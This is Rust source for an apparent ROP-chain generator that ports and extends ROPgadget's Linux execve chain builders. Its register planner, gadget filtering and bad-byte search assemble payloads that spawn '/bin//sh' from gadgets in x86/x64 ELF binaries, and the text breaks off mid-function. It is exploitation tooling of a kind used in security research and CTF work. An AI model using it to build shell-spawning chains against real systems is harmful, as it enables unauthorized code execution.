//! Linux execve chain builders — originally a faithful port of ROPgadget's
//! `ropchain/arch/ropmakerx64.py` (syscall, 59 = `__NR_execve`) and
//! `ropmakerx86.py` (int 0x80, 11).  The oracle's *shape* is still here —
//! write "/bin//sh" and a NULL word into a data section with a
//! write-what-where gadget, load the three syscall arguments, set the
//! syscall number, fire — but v0.5 replaced the oracle's single hard-coded
//! gadget recipe with a small planner, because the recipe failed outright on
//! binaries where a chain is plainly constructible (`CHLX-01`).
//!
//! What changed, and why
//! ---------------------
//!
//! * **`CHLX-01` — per-requirement fallback strategies.**  The oracle needs a
//!   *literal, leading* `xor rax, rax`, `pop rdi`, `pop rsi`, `pop rdx` and
//!   `syscall`, and aborts when any one is missing.  `plan_set_reg` instead
//!   asks the v0.4 constraint layer ([`rf_classify`]) which gadgets can put a
//!   chosen value in a register at all, and tries, in order:
//!     1. a `pop` **anywhere** in a gadget's payload window, not just the
//!        leading instruction — `pop rbx ; pop rdx ; ret` sets rdx, and so
//!        does `popal ; cld ; ret`;
//!     2. a folded zero (`xor r, r`) when the wanted value is 0;
//!     3. a register transfer — `pop rax ; ret` then `mov rdx, rax ; ret`,
//!        the same fallback the Windows builder has always had.
//!
//!   The write-what-where search likewise accepts a displacement
//!   (`mov dword ptr [eax + 0xc], edx ; ret` writes to `eax + 0xc`, so the
//!   pointer register gets `target - 0xc`).  And because the terminator now
//!   comes from the classifier rather than a string compare, `repz ret` —
//!   the AMD-K8 branch-prediction idiom, architecturally a plain near
//!   return — is usable, which is the single gadget that unblocks
//!   `elf-x64-bash-v4.1.5.1`.
//!
//! * **`CHLX-02` — the syscall number.**  The oracle builds 59 with
//!   `xor rax, rax` plus fifty-nine `add rax, 1` gadgets even when
//!   `pop rax ; ret` is sitting in the same binary.  The planner asks for
//!   "rax = 59" like any other register and only falls back to the
//!   increment ladder when nothing can pop it.
//!
//! * **`CHLX-03` — bad bytes are a search constraint, not a hard failure.**
//!   The builder used to pick `.data`, build the whole chain and then reject
//!   it on the first word containing a bad byte.  It now retries over
//!   alternative write addresses (`.data + N`, other usable sections) and
//!   alternative padding constants, and only reports the failure when every
//!   candidate is exhausted.
//!
//! * **`CHLX-05` — where "/bin//sh" is written.**  `.data` by name is still
//!   preferred (ropmakerx64.py:76-80), but the fallback is no longer "the
//!   first writable non-executable section": on this project's own fixtures
//!   that is `.tdata` (a TLS *template offset*, not an address) or
//!   `.init_array` (read-only after RELRO).  See [`usable_write_windows`].
//!
//! Preserved oracle semantics
//! --------------------------
//!   * search order: the gadget list is REVERSED first — "to find the
//!     smaller gadget" (ropmakerx64.py:136-137);
//!   * `find_exact` (`__lookingForSomeThing`): first instruction equal to
//!     the wanted text, every following instruction a `pop` or a bare `ret`
//!     (`ret 0x6` & co. rejected — they ruin the stack pointer).  It is still
//!     how the `syscall` / `int 0x80` / increment-ladder gadgets are found,
//!     and it is what `windows.rs` uses;
//!   * padding: for every payload word a gadget consumes, emit the
//!     already-set value when overwriting that register would clobber chain
//!     state, else the `0x41…` constant.  The planner extends this to
//!     *every* register in `already_set` rather than the two the oracle
//!     happened to list.
//!
//! Deliberate regex deviation (unchanged): the Python "regex" for the
//! write-what-where registers (ropmakerx64.py:29, ropmakerx86.py:29) is a
//! buggy character class that matches any 3-char string over its alphabet.

use std::collections::HashMap;

use rf_classify::{Class, Classification, Classifier, Terminator, ValueDst, ValueSrc};
use rf_core::Arch;
use rf_scan::Gadget;

use crate::plan::{ChainPlan, PlanBuilder, Strategy};
use crate::{arch_name, ChainError, ChainWord, GadgetRef, RopChain, WordKind};

/// A non-executable section candidate for the string write. `vaddr` must
/// already reflect any `--base` rebase and `--offset` slide (the caller
/// applies them, like ROPgadget's `liboffset`).
#[derive(Debug, Clone)]
pub struct DataSection {
    /// The section's name, as the container spells it.
    pub name: String,
    /// The section's address, rebase and `--offset` already applied.
    pub vaddr: u64,
    /// Whether the section is writable - a string write needs this.
    pub writable: bool,
}

const PADDING64: u64 = 0x4141_4141_4141_4141;
const PADDING32: u64 = 0x4141_4141;

/// x64 write-what-where register set (3-char names; r9 excluded — the
/// Python `{3}` quantizer can't match its 2 chars either).
pub(crate) const REGS64: &[&str] = &[
    "rax", "rbx", "rcx", "rdx", "rsi", "rdi", "r10", "r11", "r12", "r13", "r14", "r15",
];
pub(crate) const REGS32: &[&str] = &["eax", "ebx", "ecx", "edx", "esi", "edi"];

/// Sections the ELF `PT_GNU_RELRO` segment covers on every toolchain that
/// emits one, and therefore sections the loader re-maps **read-only** before
/// `main` runs (`CHLX-05`).
///
/// rf-core has real RELRO detection, but it needs the `ElfBinary`, which the
/// chain builder is deliberately not given — it receives a flat
/// `[DataSection]` so that PE, Mach-O and raw targets can use the same
/// builders.  Matching by name is what is available here and it is
/// *conservative in the right direction*: under partial or full RELRO these
/// are read-only, and on a binary with no `PT_GNU_RELRO` at all skipping
/// them only forgoes `.got`, which is never the best write target anyway.
/// Handing rf-core's answer down to the builder is a caller-side change; see
/// the note on [`usable_write_windows`].
const RELRO_SECTIONS: &[&str] = &[
    ".init_array",
    ".fini_array",
    ".preinit_array",
    ".ctors",
    ".dtors",
    ".jcr",
    ".data.rel.ro",
    ".dynamic",
    ".got",
];

/// TLS sections. `sh_addr` for `SHF_TLS` is an offset into the thread's TLS
/// block, not a virtual address: writing "/bin//sh" there writes to whatever
/// happens to live at that low address (`CHLX-05`).
const TLS_SECTIONS: &[&str] = &[".tdata", ".tbss"];

/// A section the chain may write the `execve` path into, and how far the
/// write address may slide inside it.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct WriteWindow {
    /// The section the window lives in.
    pub name: String,
    /// First usable address.
    pub base: u64,
    /// One past the last address the window is known to cover.
    pub end: u64,
}

impl WriteWindow {
    /// Addresses in this window at which a `need`-byte write fits.
    ///
    /// `base` itself is always offered — it is what the tool would have used
    /// anyway — and the slide then steps by `step` while the whole write
    /// stays inside the window.  A window whose extent is unknown (the last
    /// section, which has no successor to bound it) therefore offers exactly
    /// its base and never slides into memory nothing vouches for.
    fn slots(&self, need: u64, step: u64) -> impl Iterator<Item = u64> + '_ {
        let (base, end) = (self.base, self.end);
        std::iter::once(base).chain(
            (1u64..)
                .map(move |i| base.wrapping_add(i.wrapping_mul(step)))
                .take_while(move |a| a.saturating_add(need) <= end),
        )
    }
}

/// Is this the name of a TLS section (`CHLX-05`)?
pub fn section_is_tls(name: &str) -> bool {
    TLS_SECTIONS.contains(&name)
}

/// Is this the name of a section `PT_GNU_RELRO` covers, i.e. one the loader
/// makes read-only before `main` (`CHLX-05`)?
pub fn section_is_relro(name: &str) -> bool {
    RELRO_SECTIONS.contains(&name)
}

/// The sections a chain may write into, best first (`CHLX-05`).
///
/// The oracle takes `.data` by name and rop-finder used to fall back to "the
/// first writable non-executable section", which on the project's own
/// fixtures is `.tdata` (elf-Linux-x64/x86) or `.init_array`
/// (Linux_lib32/64.so) — a TLS template offset and a RELRO-protected page.
/// A section qualifies here only when it is
///
///   * marked writable (checked on the `.data` branch too — a section
///     *named* `.data` that is not writable is not a write target), and
///   * not TLS, and
///   * not covered by `PT_GNU_RELRO`.
///
/// `end` is derived from the next section's start rather than a declared
/// size, because [`DataSection`] carries no size: allocated sections are laid
/// out in ascending address order, so the next section's `vaddr` is an exact
/// upper bound for all but the last, which is given no room to slide.  That
/// bound is what makes `CHLX-03`'s alternative-address search safe — it can
/// never walk off the end of the section it started in.  Handing the real
/// `sh_size` (and rf-core's RELRO verdict) down would need a field on
/// `DataSection`, i.e. a change in every caller.
pub fn usable_write_windows(sections: &[DataSection]) -> Vec<WriteWindow> {
    let mut bounds: Vec<u64> = sections.iter().map(|s| s.vaddr).collect();
    bounds.sort_unstable();
    bounds.dedup();

    let window = |s: &DataSection| {
        let end = bounds
            .iter()
            .copied()
            .find(|&v| v > s.vaddr)
            .unwrap_or(s.vaddr);
        WriteWindow {
            name: s.name.clone(),
            base: s.vaddr,
            end,
        }
    };

    let usable: Vec<&DataSection> = sections
        .iter()
        .filter(|s| s.writable && !section_is_tls(&s.name) && !section_is_relro(&s.name))
        .collect();

    // Preference: `.data` (the oracle's choice), then `.bss`, then whatever
    // else survived, in section-header order.
    let mut out: Vec<WriteWindow> = Vec::new();
    for want in [".data", ".bss"] {
        if let Some(s) = usable.iter().find(|s| s.name == want) {
            out.push(window(s));
        }
    }
    for s in &usable {
        if s.name != ".data" && s.name != ".bss" {
            out.push(window(s));
        }
    }
    out
}

/// `CHLX-08`: the chain-side signal that a generated chain's addresses are
/// link-time offsets rather than runtime addresses.
///
/// Returns the warning text when the target is `ET_DYN` (a PIE executable or
/// a shared object) and the caller did not already slide the addresses with
/// `--offset`/`--base`; `None` when there is nothing to say.  The rendering
/// belongs to the front end — the PE `GUARD_CF` warning it is symmetric with
/// lives in `rf-cli` — so this function only decides *whether* to warn and
/// what to say.
pub fn pie_chain_warning(is_dyn: bool, image_base: u64, offset_applied: u64) -> Option<String> {
    if !is_dyn || offset_applied != 0 {
        return None;
    }
    Some(format!(
        "ELF is ET_DYN (PIE executable or shared object) with image base {image_base:#x}: every \
         address in this chain is a LINK-TIME offset and will be wrong under ASLR — re-run with \
         --offset <runtime load base> (or --base) once the load base is known"
    ))
}

/// Build a Linux `execve("/bin//sh", NULL, NULL)` chain.
///
/// `gadgets` is the post-dedup scan output; `data_sections` the binary's
/// non-executable sections. Dispatch mirrors ropmaker.py:23-40: ELF x86
/// and x64 only.
pub fn build_linux_execve(
    gadgets: &[Gadget],
    data_sections: &[DataSection],
    arch: Arch,
    format: &str,
    badbytes: &[u8],
) -> Result<RopChain, ChainError> {
    build_linux(
        gadgets,
        data_sections,
        arch,
        format,
        badbytes,
        &LinuxChainOpts::default(),
    )
}

/// `CHLX-03`: the (write address, padding constant) pairs to try, best
/// first.
///
/// With no bad bytes there is exactly one attempt and it is the oracle's:
/// the first usable section's base and `0x41…`.  With bad bytes the search
/// walks every usable window at `word`-sized steps and every padding
/// constant that is itself badbyte-free, which is what turns
/// "`--badbytes 60` aborts on elf-Linux-x86" into "the write lands 0x10
/// bytes further into `.data`".
fn write_attempts(
    windows: &[WriteWindow],
    badbytes: &[u8],
    word: usize,
    need: u64,
    default_pad: u64,
) -> Vec<(u64, u64)> {
    let first = (windows[0].base, default_pad);
    if badbytes.is_empty() {
        return vec![first];
    }
    /// Bound on how many (address, padding) attempts a badbyte search makes.
    const MAX_ATTEMPTS: usize = 512;

    let mut pads: Vec<u64> = Vec::new();
    for b in std::iter::once(0x41u8).chain(0x00..=0xffu8) {
        if badbytes.contains(&b) {
            continue;
        }
        // Mask to the word size: a 64-bit 0x4242… on x86 renders fine (the
        // Python writer masks) but the JSON IR would carry a value that does
        // not fit the chain's word.
        let mask = if word >= 8 {
            u64::MAX
        } else {
            (1u64 << (word * 8)) - 1
        };
        let pad = u64::from_le_bytes([b; 8]) & mask;
        if !pads.contains(&pad) {
            pads.push(pad);
        }
        if pads.len() == 2 {
            break;
        }
    }
    if pads.is_empty() {
        pads.push(default_pad);
    }

    let mut out = Vec::new();
    for w in windows {
        for addr in w.slots(need, word as u64) {
            // Every data word the chain emits is `addr + k*word`; reject the
            // whole address up front rather than building and failing.
            if (0..need / word as u64).any(|k| !value_ok(addr + k * word as u64, word, badbytes)) {
                continue;
            }
            for &pad in &pads {
                out.push((addr, pad));
                if out.len() >= MAX_ATTEMPTS {
                    return out;
                }
            }
        }
    }
    if out.is_empty() {
        out.push(first);
    }
    out
}

/// Is the little-endian packing of `value` at `word` bytes free of `bad`?
fn value_ok(value: u64, word: usize, bad: &[u8]) -> bool {
    bad.is_empty() || !value.to_le_bytes()[..word].iter().any(|b| bad.contains(b))
}

/// Word emitter with gadget-ref interning (`source_gadget` indexes the
/// chain's distinct gadget list).
pub(crate) struct ChainBuilder {
    pub(crate) words: Vec<ChainWord>,
    pub(crate) gadgets: Vec<GadgetRef>,
    gmap: HashMap<(u64, String), usize>,
    padding_const: u64,
}

impl ChainBuilder {
    pub(crate) fn new(padding_const: u64) -> Self {
        ChainBuilder {
            words: Vec::new(),
            gadgets: Vec::new(),
            gmap: HashMap::new(),
            padding_const,
        }
    }

    pub(crate) fn intern(&mut self, g: &Gadget) -> usize {
        let key = (g.vaddr, g.text());
        if let Some(&i) = self.gmap.get(&key) {
            return i;
        }
        let i = self.gadgets.len();
        self.gadgets.push(GadgetRef {
            vaddr: g.vaddr,
            text: g.text(),
        });
        self.gmap.insert(key, i);
        i
    }

    pub(crate) fn gadget(&mut self, g: &Gadget) {
        let idx = self.intern(g);
        self.words.push(ChainWord {
            value: g.vaddr,
            kind: WordKind::GadgetAddr,
            comment: g.text(),
            source_gadget: Some(idx),
        });
    }

    pub(crate) fn data(&mut self, value: u64, comment: String) {
        self.words.push(ChainWord {
            value,
            kind: WordKind::DataAddr,
            comment,
            source_gadget: None,
        });
    }

    fn word(&mut self, value: u64, kind: WordKind, comment: String) {
        self.words.push(ChainWord {
            value,
            kind,
            comment,
            source_gadget: None,
        });
    }

    fn pad(&mut self) {
        self.words.push(ChainWord {
            value: self.padding_const,
            kind: WordKind::Padding,
            comment: "padding".to_string(),
            source_gadget: None,
        });
    }

    /// ropmaker's __padding: for every `pop reg` in the gadget's tail emit
    /// a padding word — the already-set value when overwriting `reg` would
    /// clobber state, else the 0x41… constant.
    pub(crate) fn padding(&mut self, g: &Gadget, already_set: &[(&str, u64)]) {
        for insn in tail(g) {
            if let Some(reg) = insn.strip_prefix("pop ") {
                let reg = reg.trim();
                let (value, comment) = match already_set.iter().find(|(r, _)| *r == reg) {
                    Some((_, v)) => (*v, format!("padding without overwrite {reg}")),
                    None => (self.padding_const, "padding".to_string()),
                };
                self.words.push(ChainWord {
                    value,
                    kind: WordKind::Padding,
                    comment,
                    source_gadget: None,
                });
            }
        }
    }
}

pub(crate) fn insns(g: &Gadget) -> Vec<String> {
    // Gadget::text() is built by joining with " ; " (rf-scan engine.rs).
    g.text()
        .split(" ; ")
        .map(|s| s.trim().to_string())
        .collect()
}

pub(crate) fn tail(g: &Gadget) -> Vec<String> {
    insns(g).into_iter().skip(1).collect()
}

/// ropmaker's tail rule: every instruction after the first must be a `pop`
/// or a bare `ret` (ropmakerx64.py:33-42, including the `ret 0x6`
/// rejection).
pub(crate) fn clean_tail(g: &Gadget) -> bool {
    tail(g).iter().all(|insn| {
        let first = insn.split_whitespace().next().unwrap_or("");
        if first != "pop" && first != "ret" {
            return false;
        }
        // reject "ret 0x6" etc.; only the bare "ret" survives
        insn == "ret" || first == "pop"
    })
}

/// __lookingForSomeThing: first instruction == `something` exactly, clean
/// tail, first match in REVERSED gadget order (ropmakerx64.py:46-62 +
/// 136-137).
///
/// iced-x86 renders single-digit immediates as `0x1` where capstone prints
/// `1` (decimal for 0-9), so each decimal-digit token in the wanted text
/// also gets a hex-form alternate.
pub(crate) fn find_exact<'g>(gadgets_rev: &[&'g Gadget], something: &str) -> Option<&'g Gadget> {
    let forms = wanted_forms(something);
    gadgets_rev
        .iter()
        .copied()
        .find(|g| forms.contains(&insns(g)[0]) && clean_tail(g))
}

/// The wanted text plus variants with single decimal-digit immediates in
/// hex form (`add rax, 1` → also `add rax, 0x1`).
pub(crate) fn wanted_forms(something: &str) -> Vec<String> {
    let mut forms = vec![something.to_string()];
    // token boundaries: whitespace and ", "
    let bytes = something.as_bytes();
    for (i, &b) in bytes.iter().enumerate() {
        if !b.is_ascii_digit() {
            continue;
        }
        let prev_ok = i == 0 || !(bytes[i - 1].is_ascii_alphanumeric() || bytes[i - 1] == b'x');
        let next_ok = i + 1 == bytes.len() || !bytes[i + 1].is_ascii_alphanumeric();
        if prev_ok && next_ok {
            let alt = format!("{}0x{}{}", &something[..i], b as char, &something[i + 1..]);
            forms.push(alt);
        }
    }
    forms
}

// ---------------------------------------------------------------------------
// CHLX-01: the gadget model and the register-set planner
// ---------------------------------------------------------------------------

/// The single memory write a write-what-where gadget performs:
/// `[base + disp] <- src`, `width` bytes.
#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) struct MemWrite {
    base: String,
    disp: i64,
    src: String,
    width: usize,
}

/// Everything the planner needs to know about one gadget.
///
/// Built from [`rf_classify::Classification`] when the classifier has
/// decoder metadata for the gadget, and from its disassembly text when it
/// does not (the text path also keeps the unit tests, which construct
/// `Gadget`s from text alone, meaningful).  Either way a gadget only gets a
/// model at all when it is safe to drop into a `ret`-driven chain: a bare
/// near return, a stack movement the model can count, no privileged
/// instruction, no branch in the middle, and no memory access through a
/// register the chain does not control.
#[derive(Debug, Clone)]
pub(crate) struct Model {
    /// Payload words the gadget consumes before its return.
    pub(crate) slots: usize,
    /// Which register each payload slot lands in (`None`: discarded, e.g.
    /// `popal`'s esp slot, or a `ret <imm>` stack adjustment).
    slot_regs: Vec<Option<String>>,
    /// Registers the gadget forces to zero.
    zeroes: Vec<String>,
    /// `dst <- src` register moves and the move's width in bytes.
    moves: Vec<(String, String, Option<usize>)>,
    /// The gadget's single memory write, if it has one.
    pub(crate) write: Option<MemWrite>,
    /// Registers written with a value the payload does not decide.
    clobbers: Vec<String>,
}

impl Model {
    fn slot_of(&self, reg: &str) -> Option<usize> {
        self.slot_regs
            .iter()
            .position(|r| r.as_deref().is_some_and(|r| r.eq_ignore_ascii_case(reg)))
    }

    fn zeroes_reg(&self, reg: &str) -> bool {
        self.zeroes.iter().any(|r| r.eq_ignore_ascii_case(reg))
    }

    fn clobbers_reg(&self, reg: &str) -> bool {
        self.clobbers.iter().any(|r| r.eq_ignore_ascii_case(reg))
    }

    /// Can this gadget run without destroying any register in `keep`?
    ///
    /// A register the gadget re-loads from a payload slot is fine — the
    /// emitter writes the old value back into that slot.  A register it
    /// clobbers, zeroes or moves into is not.
    fn preserves(&self, keep: &[(String, u64)]) -> bool {
        keep.iter().all(|(r, _)| {
            if self.slot_of(r).is_some() {
                return true;
            }
            !self.clobbers_reg(r)
                && !self.zeroes_reg(r)
                && !self.moves.iter().any(|(d, _, _)| d.eq_ignore_ascii_case(r))
        })
    }
}

/// A gadget plus its v0.4 classification and the planner's model of it.
pub(crate) struct Ana<'g> {
    pub(crate) g: &'g Gadget,
    pub(crate) model: Option<Model>,
}

/// Shared inputs of one build attempt.
pub(crate) struct Ctx<'a> {
    pub(crate) anas: &'a [Ana<'a>],
    pub(crate) gadgets: &'a [Gadget],
    pub(crate) word: usize,
    pub(crate) badbytes: &'a [u8],
}

impl<'a> Ctx<'a> {
    fn rev(&self) -> Vec<&'a Gadget> {
        self.gadgets.iter().rev().collect()
    }
}

/// Classify every gadget once, in the oracle's REVERSED search order.
pub(crate) fn analyse<'g>(gadgets: &'g [Gadget], arch: Arch, word: usize) -> Vec<Ana<'g>> {
    let classifier = Classifier::new(arch);
    gadgets
        .iter()
        .rev()
        .map(|g| {
            let c = classifier.classify(g);
            Ana {
                g,
                model: model_from(g, &c, word),
            }
        })
        .collect()
}

/// The classifier's answer, or the text fallback when it has none.
///
/// "None" means the gadget carries no decoder metadata at all: either
/// `low_confidence` (no capstone mode reproduces its bytes) or an empty
/// classification, which is what a `Gadget` built from text alone — every
/// gadget in this module's unit tests — produces.  When the classifier DOES
/// have metadata its verdict is final: falling back to text there would
/// re-admit exactly the gadgets the semantic checks reject.
fn model_from(g: &Gadget, c: &Classification, word: usize) -> Option<Model> {
    let has_metadata = !c.low_confidence
        && (c.terminator != Terminator::None || c.stack_delta.is_some() || !c.transfers.is_empty());
    if !has_metadata {
        return model_from_text(g, word);
    }
    if c.privileged || !c.terminator.is_bare_return() || c.mid_branches > 0 {
        return None;
    }
    // A gadget that dereferences anything the chain has not set up faults.
    // `test byte ptr [rax + rcx*4 + 1], 0x74 ; mov qword ptr [rsi], rcx ; ret`
    // in elf-Linux-x64 is a real write-what-where whose FIRST instruction
    // reads through rax and the "/bin//sh" value in rcx — it was selected,
    // emitted, and faulted under the emulator at step 6.  A compare has no
    // transfer, so only the label sees it.  Stack pivots and dispatchers go
    // the same way: neither returns to the next chain word.
    if c.labels
        .iter()
        .any(|l| matches!(l, Class::MemRead | Class::StackPivot | Class::Dispatcher))
    {
        return None;
    }
    if insns(g).iter().any(|i| unusable_insn(i)) {
        return None;
    }
    let delta = c.stack_delta?;
    if delta < word as i64 {
        return None;
    }
    let consumed = delta as usize - word;
    if consumed % word != 0 {
        return None;
    }
    let slots = consumed / word;

    // ONLY `sets` — a register in `clobbers` is written with a value the
    // payload does not decide, so its slot is not a way to set it and
    // refilling that slot would not preserve it either.  `pop rax ; setne al
    // ; movzx eax, al ; ret` in Linux_lib64.so pops rax and then overwrites
    // it with 0 or 1; it reports `clobbers: ["rax"]`, and treating its pop
    // slot as an rax setter is how that chain reached `syscall` with rax = 0.
    let mut slot_regs = vec![None; slots];
    for reg in &c.sets {
        if let Some(off) = c.stack_offset_of(reg) {
            if off >= 0 && off as usize % word == 0 {
                let i = off as usize / word;
                if i < slots {
                    slot_regs[i] = Some(reg.clone());
                }
            }
        }
    }
    apply_popa_layout(g, c, word, slots, &mut slot_regs);

    // A folded zero is payload-decided, so it lives in `sets`.  A register
    // TRANSFER is not: `mov rsi, rax ; ret` "writes rsi and clobbers it" in
    // the classifier's partition, because the value came from an incoming
    // register — which is exactly the value the chain put there one gadget
    // earlier.  Reading `moves` out of `sets` alone found 2 transfer gadgets
    // in the 45,377 of elf-x64-bash-v4.1.5.1; reading both finds the rest.
    let mut zeroes = Vec::new();
    let mut moves = Vec::new();
    for reg in c.sets.iter().chain(c.clobbers.iter()) {
        match c.last_transfer_to(reg).map(|t| (&t.src, t.rmw, t.width)) {
            Some((ValueSrc::Immediate { value: 0 }, false, _)) => zeroes.push(reg.clone()),
            Some((ValueSrc::Register { reg: src }, false, w)) => {
                moves.push((reg.clone(), src.clone(), w.map(|w| w as usize)))
            }
            _ => {}
        }
    }

    // The write-what-where primitive: exactly one memory write, addressed
    // through a single base register with no index, sourced from a register,
    // and not a read-modify-write.  Every other transfer must be a payload
    // load — a gadget that also reads through an uncontrolled pointer would
    // fault before the write lands.
    let mut write = None;
    let mut writes_seen = 0usize;
    for t in &c.transfers {
        let ValueDst::Memory { base, index, disp } = &t.dst else {
            continue;
        };
        writes_seen += 1;
        let (Some(base), None, ValueSrc::Register { reg: src }, false) =
            (base.as_ref(), index.as_ref(), &t.src, t.rmw)
        else {
            continue;
        };
        let Some(w) = t.width else { continue };
        if w as usize != word {
            continue;
        }
        // The pointer and the value must be exactly what the chain put
        // there.  A gadget that writes either of them writes it with
        // something else: `sub esi, ecx ; mov qword ptr [rdx], rsi ; ret` in
        // Linux_lib64.so stores rsi MINUS an uncontrolled ecx, and reports
        // `clobbers: ["rsi"]`.  `sets`/`clobbers` are the full-width answer;
        // the transfer list spells operands as written (`esi`, `al`), so it
        // is the wrong list to compare register names against.
        if c.sets_reg(base) || c.clobbers_reg(base) || c.sets_reg(src) || c.clobbers_reg(src) {
            continue;
        }
        write = Some(MemWrite {
            base: base.clone(),
            disp: *disp,
            src: src.clone(),
            width: word,
        });
    }
    if writes_seen > 1 || (writes_seen == 1 && write.is_none()) {
        // Either a second, unasked-for store, or a single store this model
        // cannot drive (wrong width, an indexed or absolute destination, a
        // read-modify-write).  Neither can appear in a chain: the gadget is
        // not usable at all, not "usable minus its write".
        return None;
    }
    // The ONLY register that may have to hold a pointer before the gadget
    // runs is the write-what-where base, which the chain sets on purpose.
    // Any other memory access — `mov rdx, qword ptr [rax]`,
    // `add byte ptr [rax], al` — reads or writes through a register whose
    // value the chain does not control, and faults.
    let write_base = write.as_ref().map(|w| w.base.as_str());
    if c.transfers
        .iter()
        .any(|t| t.needs.iter().any(|r| Some(r.as_str()) != write_base))
    {
        return None;
    }

    Some(Model {
        slots,
        slot_regs,
        zeroes,
        moves,
        write,
        clobbers: c.clobbers.clone(),
    })
}

/// Instructions no `ret`-driven chain link may contain, whatever the
/// classifier says about the gadget's stack delta.
///
/// Both entries here are emulator findings on elf-Linux-x86, not theory:
///
/// * **a segment-overridden memory operand.** `mov dword ptr gs:[eax], edx`
///   is reported as a write through eax, but it lands at `gs_base + eax`.
///   It passed under the emulator only because the harness leaves gs at 0;
///   on a real process it writes into the TLS block.
/// * **`push`, `leave`, `enter`, and a `pop` into a segment register.**
///   `push ecx ; pop es ; pop ebx ; ret` really does load ebx from payload
///   word 0 — the push and the segment pop cancel in the stack accounting —
///   and it faulted at the `pop es`, which loads an uncontrolled selector.
///   These are also exactly the instructions `RopChain::verify_stack_accounting`
///   refuses to model, so excluding them keeps every emitted chain fully
///   accounted rather than abstained-on.
///
/// `std` is here for a third reason: it leaves the direction flag SET, and
/// the System V ABI requires DF clear on entry to every function, so a chain
/// that passes through one hands the callee a machine in a state it is
/// entitled to assume cannot happen.  `std ; cmp edi, 0x4c483ff ; pop ebx ;
/// ret` was being selected on elf-Linux-x86-NDH-chall in preference to a
/// plain `pop ebx ; ret` purely because it sat at a higher address.
fn unusable_insn(insn: &str) -> bool {
    const SEGMENTS: [&str; 6] = ["cs:", "ds:", "es:", "fs:", "gs:", "ss:"];
    if SEGMENTS.iter().any(|s| insn.contains(s)) {
        return true;
    }
    let (head, rest) = insn.split_once(' ').unwrap_or((insn, ""));
    if matches!(
        head,
        "std"
            | "push"
            | "pusha"
            | "pushal"
            | "pushad"
            | "pushaw"
            | "pushf"
            | "pushfd"
            | "pushfq"
            | "leave"
            | "enter"
            | "lcall"
            | "ljmp"
            | "les"
            | "lds"
            | "lfs"
            | "lgs"
            | "lss"
    ) {
        return true;
    }
    head == "pop"
        && matches!(
            rest.trim(),
            "cs" | "ds" | "es" | "fs" | "gs" | "ss" | "eflags" | "flags"
        )
}

/// `popa`/`popad` restores eight registers from the payload in one
/// instruction, and `rf_classify` reports them all in `sets` without a
/// per-register transfer — so `stack_offset_of` cannot say which payload
/// word feeds which register.  The layout is fixed by the ISA
/// (`edi, esi, ebp, esp, ebx, edx, ecx, eax`, ascending, with the `esp`
/// slot discarded by the instruction), so fill it in.
///
/// Only applied when the `popa` is the gadget's FIRST instruction, so the
/// slot offsets are the payload offsets with nothing to correct for, and
/// only for slots the classifier left unassigned.  This is the one gadget
/// that makes elf-FreeBSD-x86 buildable: it is the binary's only route to
/// ecx (`CHLX-01`).
fn apply_popa_layout(
    g: &Gadget,
    c: &Classification,
    word: usize,
    slots: usize,
    slot_regs: &mut [Option<String>],
) {
    const POPA_ORDER: [&str; 8] = ["di", "si", "bp", "sp", "bx", "dx", "cx", "ax"];
    let first = insns(g).swap_remove(0);
    if !matches!(first.as_str(), "popal" | "popad" | "popa" | "popaw") {
        return;
    }
    if word != 4 || slots < 8 {
        return;
    }
    for (i, suffix) in POPA_ORDER.iter().enumerate() {
        if *suffix == "sp" || slot_regs[i].is_some() {
            continue;
        }
        let reg = format!("e{suffix}");
        if c.sets.iter().any(|r| r.eq_ignore_ascii_case(&reg)) {
            slot_regs[i] = Some(reg);
        }
    }
}

/// Text fallback: the shapes the pre-v0.5 builder understood, plus the
/// `repz ret` / `rep ret` / `ret 0` spellings of a bare near return.
///
/// Reached for a gadget the classifier could not decode, and for the
/// text-only `Gadget`s the unit tests build.  Anything it does not
/// recognise yields `None`, so an unmodelled instruction can never end up
/// in a chain by accident.
fn model_from_text(g: &Gadget, word: usize) -> Option<Model> {
    let insns = insns(g);
    let (last, body) = insns.split_last()?;
    if !is_bare_ret(last) {
        return None;
    }
    if insns.iter().any(|i| unusable_insn(i)) {
        return None;
    }
    let mut m = Model {
        slots: 0,
        slot_regs: Vec::new(),
        zeroes: Vec::new(),
        moves: Vec::new(),
        write: None,
        clobbers: Vec::new(),
    };
    for insn in body {
        if let Some(reg) = insn.strip_prefix("pop ") {
            let reg = reg.trim();
            if !is_reg_name(reg) {
                return None;
            }
            m.slot_regs.push(Some(reg.to_string()));
            m.slots += 1;
            continue;
        }
        if let Some((op, args)) = insn.split_once(' ') {
            if let Some((a, b)) = args.split_once(", ") {
                match op {
                    "xor" | "sub" if a == b && is_reg_name(a) => {
                        m.zeroes.push(a.to_string());
                        continue;
                    }
                    "mov" if is_reg_name(a) && is_reg_name(b) => {
                        m.moves.push((a.to_string(), b.to_string(), None));
                        continue;
                    }
                    "mov" if m.write.is_none() => {
                        // mov <size> ptr [<dst>], <src>   (anchored, like the
                        // Python `$`), now also accepting `[<dst> + N]`.
                        if let Some((base, disp)) = parse_mem_operand(a, word) {
                            if is_reg_name(b) {
                                m.write = Some(MemWrite {
                                    base,
                                    disp,
                                    src: b.to_string(),
                                    width: word,
                                });
                                continue;
                            }
                        }
                        return None;
                    }
                    _ => return None,
                }
            }
        }
        return None;
    }
    Some(m)
}

/// `qword ptr [rdi]` / `dword ptr [eax + 0xc]` / `qword ptr [rax - 8]` ->
/// (base register, displacement), when the width matches the word size.
fn parse_mem_operand(text: &str, word: usize) -> Option<(String, i64)> {
    let want = if word == 8 {
        "qword ptr ["
    } else {
        "dword ptr ["
    };
    let inner = text.strip_prefix(want)?.strip_suffix(']')?;
    if let Some((base, disp)) = inner.split_once(" + ") {
        return Some((base.to_string(), parse_imm(disp)?));
    }
    if let Some((base, disp)) = inner.split_once(" - ") {
        return Some((base.to_string(), -parse_imm(disp)?));
    }
    is_reg_name(inner).then(|| (inner.to_string(), 0))
}

fn parse_imm(text: &str) -> Option<i64> {
    let t = text.trim();
    match t.strip_prefix("0x") {
        Some(hex) => i64::from_str_radix(hex, 16).ok(),
        None => t.parse::<i64>().ok(),
    }
}

/// A plain near return: `ret`, and the `repz ret` / `rep ret` branch-
/// prediction idiom, and `ret 0`, which pops nothing extra.  `ret 0x6` and
/// friends are still rejected — they move the stack pointer.
fn is_bare_ret(insn: &str) -> bool {
    match insn {
        "ret" | "repz ret" | "rep ret" => true,
        other => other
            .strip_prefix("ret ")
            .and_then(parse_imm)
            .is_some_and(|imm| imm == 0),
